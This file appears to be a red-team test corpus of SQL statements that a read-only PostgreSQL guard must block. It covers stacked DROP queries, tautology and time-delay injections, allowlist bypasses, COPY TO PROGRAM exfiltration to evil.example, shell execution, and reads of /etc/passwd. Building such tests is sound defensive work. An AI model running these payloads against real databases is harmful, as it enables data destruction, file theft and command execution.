-- pg-guard red-team corpus. Every statement below MUST be blocked under a
-- read-only policy. One SQL statement per logical line (lines starting with
-- `--` are comments/section headers and are skipped by the loader).

-- == 1. stacked / piggyback queries (the COMMIT;DROP class) ==
COMMIT; DROP SCHEMA public CASCADE;
SELECT * FROM orders; DROP TABLE orders;
SELECT 1; DROP TABLE orders
SELECT * FROM orders;/**/DROP TABLE orders
DELETE FROM orders;--
;DROP TABLE orders
BEGIN; UPDATE orders SET total = 0; COMMIT;

-- == 2. case / whitespace / comment keyword-splitting bypass ==
drop table orders
DrOp TaBlE orders
DROP/**/TABLE orders
DELETE/**/FROM orders

-- == 3. ToxicSQL payload families ==
-- comment-terminated tautology
SELECT * FROM orders WHERE id = 1 OR 1=1 --
-- tautology
SELECT * FROM orders WHERE 1=1
SELECT * FROM orders WHERE 'a'='a'
-- time-delay
SELECT pg_sleep(5)
SELECT * FROM orders WHERE id = (SELECT 1 WHERE pg_sleep(10) IS NULL)
-- piggyback
SELECT * FROM orders; DROP TABLE customers

-- == 4. allowlist bypass via subquery / CTE / set ops ==
SELECT * FROM (SELECT * FROM secrets) t
SELECT * FROM orders UNION SELECT * FROM secrets
WITH s AS (SELECT * FROM secrets) SELECT * FROM s
SELECT * FROM other.orders
SELECT * FROM "Secrets"

-- == 5. write-via-read: data-modifying CTE, SELECT INTO, locks, COPY, DO ==
WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d
WITH i AS (INSERT INTO orders VALUES (1) RETURNING *) SELECT * FROM i
SELECT * INTO newtbl FROM orders
SELECT * FROM orders FOR UPDATE
COPY orders TO PROGRAM 'curl http://evil.example/$(cat /etc/passwd)'
COPY orders FROM PROGRAM 'sh -c id'
DO $$ BEGIN EXECUTE 'DROP TABLE orders'; END $$
VACUUM FULL
GRANT ALL ON orders TO PUBLIC
ALTER TABLE orders ADD COLUMN backdoor TEXT
TRUNCATE TABLE orders
CREATE TABLE evil (id INT)
SET search_path TO evil

-- == 6. WHERE-less writes (blocked in read-only too) ==
UPDATE orders SET total = 0
DELETE FROM orders

-- == 7. dangerous server-side functions ==
SELECT pg_read_file('/etc/passwd')
SELECT * FROM pg_read_file('/etc/passwd')
SELECT lo_import('/etc/passwd')
SELECT dblink('host=evil', 'SELECT 1')
